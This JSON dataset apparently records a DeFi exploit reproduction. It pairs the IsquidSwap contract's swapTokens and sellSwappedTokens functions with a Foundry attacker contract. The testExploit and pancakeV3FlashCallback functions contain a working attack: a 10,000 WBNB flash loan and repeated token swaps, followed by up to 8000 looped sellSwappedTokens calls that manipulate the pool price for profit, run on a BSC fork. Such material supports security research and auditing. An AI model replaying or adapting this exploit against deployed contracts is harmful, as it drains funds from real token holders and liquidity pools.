[
  {
    "contract/interface": "IsquidSwap",
    "source_type": "victim_contract",
    "function_name": "sellSwappedTokens",
    "original_code": "    function sellSwappedTokens(uint256 sellOption) external nonReentrant lock {\n        require(swapEnabled, \"Swap is not enabled yet\");\n        uint256 sellAmount;\n        // uint256 sellAmount = totalSwappedToSell > 500000 ether ? 500000 ether : totalSwappedToSell;\n        if (sellOption == 1) {\n            sellAmount = totalSwappedToSell > ALTERNATIVE_SELL_AMOUNT ? ALTERNATIVE_SELL_AMOUNT : totalSwappedToSell;\n        } else {\n            sellAmount = totalSwappedToSell > DEFAULT_SELL_AMOUNT ? DEFAULT_SELL_AMOUNT : totalSwappedToSell;\n        }\n\n        require(sellAmount > 0, \"No tokens to sell\");\n\n        uint256 squidV2BalanceBefore = newSquidToken.balanceOf(address(this));\n\n        // Set slippage to 5%\n        uint256 minOut = getMinOut(sellAmount);\n\n        // Approve the router to spend SQUID V1\n        oldSquidToken.approve(address(pancakeRouter), sellAmount);\n\n        address[] memory path = new address[](3);\n        path[0] = address(oldSquidToken);\n        path[1] = addressWBNB;\n        path[2] = address(newSquidToken);\n\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            sellAmount,\n            minOut, // Min amount out after slippage\n            path,\n            address(this),\n            block.timestamp\n        );\n\n        // Update totalSwappedToSell\n        totalSwappedToSell -= sellAmount;\n\n        // Calculate the amount of new SQUID V2 to burn\n        uint256 newSquidBalance = newSquidToken.balanceOf(address(this));\n\n        uint256 burnSquidV2Amount = newSquidBalance - squidV2BalanceBefore;\n",
    "description": ""
  },
  {
    "contract/interface": "IsquidSwap",
    "source_type": "victim_contract",
    "function_name": "swapTokens",
    "original_code": "    function swapTokens(uint256 amount) external nonReentrant lock {\n        require(swapEnabled, \"Swap is not enabled yet\");\n        require(!blacklist[msg.sender], \"Address is blacklisted\");\n        require(oldSquidToken.balanceOf(msg.sender) >= amount, \"Insufficient old token balance\");\n        // require(newSquidToken.balanceOf(address(this)) >= amount, \"Insufficient new token balance in contract\");\n\n        uint256 squidV2BalanceBefore = newSquidToken.balanceOf(address(this));\n        require(squidV2BalanceBefore >= amount, \"Insufficient new token balance in contract\");\n\n        uint256 squidV1BalanceBefore = oldSquidToken.balanceOf(address(this));\n\n        // Transfer old tokens from user to this contract\n        oldSquidToken.safeTransferFrom(msg.sender, address(this), amount);\n\n        uint256 squidV1BalanceAfter = oldSquidToken.balanceOf(address(this));\n\n        require(squidV1BalanceAfter - squidV1BalanceBefore == amount, \"Should match Squid V1 amount after swap.\");\n\n        // Transfer new tokens to user\n        newSquidToken.safeTransfer(msg.sender, amount);\n\n        uint256 squidV2BalanceAfter = newSquidToken.balanceOf(address(this));\n        require(squidV2BalanceBefore - squidV2BalanceAfter == amount, \"Should match Squid V2 amount after swap.\");\n\n        // Increment the total swapped amount and totalSwappedToSell\n        totalSwapped += amount;\n        totalSwappedToSell += amount;\n\n        emit Swap(msg.sender, amount, totalSwapped);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeV3FlashCallback",
    "original_code": "    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, /*fee1*/ bytes memory /*data*/ ) public {\n        swap_token_to_token(address(WBNB), address(SQUID_1), 7000 ether);\n        SQUID_1.approve(address(SQUID_SWAP), SQUID_1.balanceOf(address(this)));\n        SQUID_SWAP.swapTokens(SQUID_1.balanceOf(address(this)));\n        swap_token_to_token(address(WBNB), address(SQUID_2), 3000 ether);\n        uint256 i = 0;\n        uint256 j = 0;\n        while (i < 8000) {\n            try SQUID_SWAP.sellSwappedTokens(0) {}\n            catch {\n                break;\n            }\n            i++;\n        }\n\n        while (j < 4) {\n            swap_token_to_token(address(SQUID_2), address(WBNB), SQUID_2.balanceOf(address(this)));\n            swap_token_to_token(address(WBNB), address(SQUID_1), 7000 ether);\n            SQUID_1.approve(address(SQUID_SWAP), SQUID_1.balanceOf(address(this)));\n            SQUID_SWAP.swapTokens(SQUID_1.balanceOf(address(this)));\n            swap_token_to_token(address(WBNB), address(SQUID_2), 3000 ether);\n            while (i < 8000) {\n                try SQUID_SWAP.sellSwappedTokens(0) {}\n                catch {\n                    break;\n                }\n                i++;\n            }\n            j++;\n        }\n        swap_token_to_token(address(SQUID_2), address(WBNB), SQUID_2.balanceOf(address(this)));\n        WBNB.transfer(address(pool), borrow_amount + fee1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 37_672_969);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Begin] Attacker WBNB before exploit\", WBNB.balanceOf(address(this)), 18);\n        borrow_amount = 10_000 ether;\n        pool.flash(address(this), 0, borrow_amount, \"\");\n        emit log_named_decimal_uint(\"[End] Attacker WBNB after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]